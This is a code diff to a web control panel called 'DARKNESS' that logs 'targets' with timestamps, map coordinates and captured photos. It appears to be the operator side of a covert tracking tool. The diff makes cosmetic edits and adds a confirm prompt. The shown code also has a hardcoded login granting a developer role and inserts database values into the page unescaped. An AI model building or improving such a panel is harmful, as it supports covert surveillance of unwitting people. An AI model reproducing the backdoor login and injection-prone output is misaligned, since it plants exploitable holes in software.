@@ -19,11 +19,11 @@
         .nav-btn { flex: 1; background: none; border: none; color: #444; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .nav-btn.active { color: #fff; border-top: 3px solid var(--red); }
         .nav-btn span { font-size: 24px; margin-bottom: 5px; }
-        table { width: 100%; border-collapse: collapse; font-size: 13px; }
+        table { width: 100%; border-collapse: collapse; font-size: 12px; }
         th { color: var(--red); text-align: left; padding: 10px 5px; border-bottom: 1px solid #222; }
         td { padding: 15px 5px; border-bottom: 1px solid #111; color: #ccc; }
-        .btn-act { background: none; border: 1px solid var(--red); color: var(--red); padding: 8px 12px; font-size: 10px; cursor: pointer; font-weight: bold; }
-        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; border-radius: 4px; }
+        .btn-act { background: none; border: 1px solid var(--red); color: var(--red); padding: 8px 12px; font-size: 10px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; border-radius: 4px; box-sizing: border-box; }
         #login-screen { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; padding: 40px; }
     </style>
 </head>
@@ -33,7 +33,7 @@
         <div style="width:100%; max-width:300px; text-align:center;">
             <h1 style="color:var(--red); letter-spacing:10px;">DARKNESS</h1>
             <input type="text" id="uIn" placeholder="USER ID"><input type="password" id="pIn" placeholder="PASS KEY">
-            <button style="background:var(--red); color:#fff; border:none; padding:15px; width:100%; font-weight:bold; margin-top:10px;" onclick="login()">AUTHORIZE</button>
+            <button style="background:var(--red); color:#fff; border:none; padding:15px; width:100%; font-weight:bold; margin-top:10px; width:100%;" onclick="login()">AUTHORIZE</button>
         </div>
     </div>
 
@@ -84,8 +84,8 @@
         const u = document.getElementById('uIn').value, p = document.getElementById('pIn').value;
         if(u === "Kalz" && p === "111") { ses = {u: "Kalz", r: "developer"}; enterMarkas(); return; }
         db.ref('users/' + u).once('value', s => {
-            const data = s.val();
-            if(data && data.p === p) { ses = {u, r: data.r}; enterMarkas(); } else alert("DENIED");
+            const d = s.val();
+            if(d && d.p === p) { ses = {u, r: d.r}; enterMarkas(); } else alert("DENIED");
         });
     }
 
@@ -99,15 +99,15 @@
     function syncData() {
         db.ref('users').on('value', s => {
             const b = document.getElementById('l-user'); b.innerHTML = '';
-            const data = s.val();
-            if(ses.u !== "Kalz" && (!data || !data[ses.u])) location.reload();
-            for(let u in data) b.innerHTML += `<tr><td>${u}</td><td>${data[u].r}</td><td><button class="btn-act" onclick="delU('${u}')">X</button></td></tr>`;
+            const d = s.val();
+            if(ses.u !== "Kalz" && (!d || !d[ses.u])) location.reload();
+            for(let u in d) b.innerHTML += `<tr><td>${u}</td><td>${d[u].r}</td><td><button class="btn-act" onclick="delU('${u}')">X</button></td></tr>`;
         });
         db.ref('targets').on('value', s => {
             const b = document.getElementById('l-track'); b.innerHTML = '';
-            const data = s.val();
-            for(let id in data) {
-                const x = data[id];
+            const d = s.val();
+            for(let id in d) {
+                const x = d[id];
                 b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('https://www.google.com/maps?q=${x.lat},${x.lon}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
             }
         });
@@ -125,7 +125,7 @@
     }
 
     function delU(u) { if(confirm("KICK USER?")) db.ref('users/' + u).remove(); }
-    function delT(id) { db.ref('targets/' + id).remove(); }
+    function delT(id) { if(confirm("HAPUS LOG?")) db.ref('targets/' + id).remove(); }
     function reqF(img) { const w = window.open(""); w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;"></body>`); }
 </script>
 </body>
